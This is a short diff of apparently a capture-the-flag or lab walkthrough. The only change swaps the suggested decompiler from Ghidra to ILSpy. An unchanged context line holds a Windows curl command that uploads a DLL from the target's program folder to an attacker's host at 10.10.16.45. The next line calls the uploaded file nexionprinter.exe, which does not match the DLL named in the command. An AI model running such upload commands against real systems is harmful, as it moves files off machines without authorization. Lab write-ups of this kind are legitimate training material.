@@ -204,4 +204,4 @@ Then execute the following at windows cmd:
 curl.exe -X POST -F "files=@C:\program files\nexion systems\docreader\publish\NexionDocReader.dll" http://10.10.16.45:8000/upload
 ````
 
-Now you have nexionprinter.exe at your kali. Decompile it with ghidra
+Now you have nexionprinter.exe at your kali. Decompile it with ilspy 
